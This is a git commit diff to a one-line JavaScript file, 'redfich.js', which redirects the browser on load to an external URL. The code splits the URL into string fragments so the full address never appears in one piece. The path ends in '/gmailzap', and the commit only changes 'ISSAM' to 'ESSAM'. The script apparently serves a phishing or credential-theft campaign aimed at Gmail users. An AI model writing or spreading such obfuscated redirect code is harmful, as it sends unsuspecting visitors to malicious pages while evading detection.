0cb3e365dc345f36c0605ac666983b31717e0bd7
samanderbusk <102687098+samanderbusk@users.noreply.github.com>
2022-10-31 01:31:49 +0100

    Update redfich.js

--- redfich.js
+++ redfich.js
@@ -1,1 +1,1 @@
-window.location.replace(``.concat(`ht`,`tps:/`,`/www.road`,`sworks`,`.com/gQ_`,`hBEIKQRfugBl4Sr-C7BBL6uH-W8CvxHKFT2mzoeltOff1_rKCrkXKfi3RCT9Fer_dnbY8Op9vdhYH46raxA~~/ISSAM/gmailzap`));
+window.location.replace(``.concat(`ht`,`tps:/`,`/www.road`,`sworks`,`.com/gQ_`,`hBEIKQRfugBl4Sr-C7BBL6uH-W8CvxHKFT2mzoeltOff1_rKCrkXKfi3RCT9Fer_dnbY8Op9vdhYH46raxA~~/ESSAM/gmailzap`));
